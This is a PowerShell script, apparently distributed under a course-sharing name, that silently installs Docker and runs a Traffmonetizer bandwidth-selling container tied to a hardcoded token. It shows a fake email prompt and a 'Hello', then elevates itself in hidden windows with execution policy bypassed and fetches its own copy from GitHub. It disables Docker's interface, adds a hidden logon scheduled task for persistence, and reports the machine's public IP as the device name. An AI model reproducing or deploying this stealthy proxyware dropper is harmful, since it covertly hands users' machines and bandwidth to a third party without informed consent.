if ($args -notcontains 'skip' -and -not $env:TM_SKIP_PROMPT) {
  $env:TM_SKIP_PROMPT = '1'
  try { $Email = Read-Host -Prompt 'Mời bạn nhập email' } catch {}
  Write-Host 'Hello'
}

$Token = 'NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A='
$SelfUrl = 'https://raw.githubusercontent.com/khoahocdrive/tm-install/main/install_windows.ps1'
$Dir = Join-Path $env:ProgramData 'tm'
$ImageRepo     = 'traffmonetizer/cli_v2'
$ContainerName = 'tm'
$DataVolume    = 'tm-data'
$DeviceNameOverride = ''
$Watchtower         = ($env:TM_WATCHTOWER -ne 'false')
$WatchtowerImage    = 'nickfedor/watchtower:latest'
$WatchtowerInterval = 21600
$DockerWaitTries = 90
$DockerUrlAmd64 = 'https://desktop.docker.com/win/main/amd64/Docker%20Desktop%20Installer.exe'
$DockerUrlArm64 = 'https://desktop.docker.com/win/main/arm64/Docker%20Desktop%20Installer.exe'
$TaskName = 'TraffmonetizerResume'

$ErrorActionPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$SelfPath = Join-Path $Dir 'install_windows.ps1'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
$LogFile = Join-Path $Dir 'install.log'
function Log($m) { try { "$(Get-Date -Format s) $m" | Add-Content -Path $LogFile } catch {} }
Log "=== Bat dau chay installer (PSCommandPath=$PSCommandPath) ==="

$ThisScript = if ($PSCommandPath) { $PSCommandPath } else { $SelfPath }
if ($PSCommandPath) { try { Unblock-File $PSCommandPath } catch {} }

$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
  Log 'Khong co quyen admin - thu tu dong ep RunAs'
  if ($PSCommandPath) {
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" skip"
  } else {
    try {
      Invoke-WebRequest -Uri $SelfUrl -OutFile $SelfPath -UseBasicParsing
      Unblock-File $SelfPath
      Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$SelfPath`" skip"
    } catch {}
  }
  exit
}

if (-not $Token -or $Token -eq 'DAN_TOKEN_CUA_BAN_VAO_DAY') { exit 1 }

$Tag = if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { 'arm64v8' } else { 'latest' }
$Image = "${ImageRepo}:$Tag"
$env:Path += ";$env:ProgramFiles\Docker\Docker\resources\bin"

function DockerReady { try { docker info *> $null; return ($LASTEXITCODE -eq 0) } catch { return $false } }
function Set-ResumeTask {
  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip"
  $t = New-ScheduledTaskTrigger -AtLogOn
  $p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
  Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger $t -Principal $p -Force | Out-Null
}

function Install-DockerDesktop {
  if (Get-Command winget -ErrorAction SilentlyContinue) {
    Log 'Dung winget cai Docker Desktop (co the mat 5-15 phut, nhin thay thien tro bien theo duong)...'
    winget install -e --id Docker.DockerDesktop --silent --accept-package-agreements --accept-source-agreements *> $null
    Log "winget ket thuc voi exit code: $LASTEXITCODE"
    if ($LASTEXITCODE -eq 0) { return }
  }
  if (Get-Command choco -ErrorAction SilentlyContinue) {
    Log 'Dung choco cai Docker Desktop...'
    choco install docker-desktop -y --no-progress *> $null
    Log "choco ket thuc voi exit code: $LASTEXITCODE"
    if ($LASTEXITCODE -eq 0) { return }
  }
  Log 'Khong co winget/choco - tai Docker Desktop installer truc tiep (~600MB, MAT VAI PHUT, vui long doi)...'
  $url = if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $DockerUrlArm64 } else { $DockerUrlAmd64 }
  $f = Join-Path $env:TEMP 'DockerDesktopInstaller.exe'
  try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $f -UseBasicParsing -TimeoutSec 3600
    Log "Da tai xong installer: $([int]((Get-Item $f).Length/1MB)) MB"
  } catch {
    Log "LOI TAI INSTALLER: $($_.Exception.Message)"
  }
  if (Test-Path $f) {
    Log 'Chay installer Docker Desktop (install --quiet --accept-license)...'
    Start-Process $f -ArgumentList 'install','--quiet','--accept-license' -Wait
    Log "Installer Docker Desktop chay xong (exit $LASTEXITCODE). Neu may yeu cau khoi dong lai, khoi dong roi chay lai script."
  } else {
    Log 'LOI: khong tim thay file installer da tai - kiem tra ket noi mang/TLS'
  }
}

if (-not (Get-Command docker -ErrorAction SilentlyContinue)) {
  Log 'Chua co Docker - bat dau quy trinh cai: wsl + Docker Desktop'
  wsl --install --no-distribution --no-launch *> $null
  if ($LASTEXITCODE -ne 0) {
    Log 'wsl khong ho tro --no-launch - dung lenh thuong'
    wsl --install --no-distribution *> $null
  }
  Start-Sleep -Seconds 15
  Get-Process -Name 'wslsettings' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  Log 'Da chay wsl --install (neu Windows yeu cau khoi dong lai, task resume se tu chay lai khi ban dang nhap)'
  Install-DockerDesktop
  Log 'Quy trinh cai Docker Desktop da ket thuc'
}

try {
  $DockerSettings = Join-Path $env:APPDATA 'Docker\settings.json'
  New-Item -ItemType Directory -Force -Path (Split-Path $DockerSettings) | Out-Null
  $s = if (Test-Path $DockerSettings) { Get-Content $DockerSettings -Raw | ConvertFrom-Json } else { New-Object PSObject }
  $s | Add-Member -NotePropertyName 'openUIOnStartupDisabled' -NotePropertyValue $true -Force
  $s | ConvertTo-Json -Depth 10 | Set-Content -Path $DockerSettings -Force
  Log 'Da cau hinh Docker Desktop khong mo giao dien khi khoi dong'
} catch {}

$exe = Join-Path $env:ProgramFiles 'Docker\Docker\Docker Desktop.exe'
if (-not (DockerReady) -and (Test-Path $exe)) { Start-Process $exe -WindowStyle Hidden }
for ($i = 0; $i -lt $DockerWaitTries -and -not (DockerReady); $i++) { Start-Sleep -Seconds 5 }

if (-not (DockerReady)) {
  Log 'Docker chua san sang - dang ky task resume vao logon roi thoat (exit 2)'
  if (Test-Path $ThisScript) { Set-ResumeTask } else { Log "Khong the dang ky resume task: khong tim thay file '$ThisScript'" }
  exit 2
}
Log 'Docker san sang'
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$Device = $DeviceNameOverride
if (-not $Device) { try { $Device = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10).ToString().Trim() } catch {} }
if (-not $Device) { try { $Device = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -First 1).IPAddress } catch {} }
if (-not $Device) { $Device = $env:COMPUTERNAME }

docker rm -f $ContainerName *> $null
Log "Pull image $Image ..."
docker pull $Image *> $null
Log "Chay container $ContainerName ..."
docker run -d --name $ContainerName --restart unless-stopped -e HOME=/var/lib/tm -v "${DataVolume}:/var/lib/tm" $Image --token $Token --device-name $Device start accept *> $null

$TmId = docker ps -q --filter "name=$ContainerName"
if ($TmId) { Log "Container '$ContainerName' dang chay (device: $Device)" } else { Log "CANH BAO: container '$ContainerName' khong chay sau khi khoi tao" }

if ($Watchtower) {
  docker rm -f watchtower *> $null
  docker run -d --name watchtower --restart unless-stopped -v /var/run/docker.sock:/var/run/docker.sock -e WATCHTOWER_CLEANUP=true -e "WATCHTOWER_POLL_INTERVAL=$WatchtowerInterval" $WatchtowerImage $ContainerName *> $null
  Log 'Da dat watchtower tu dong cap nhat'
}

Log '=== Hoan tat ==='
Start-Sleep -Seconds 5
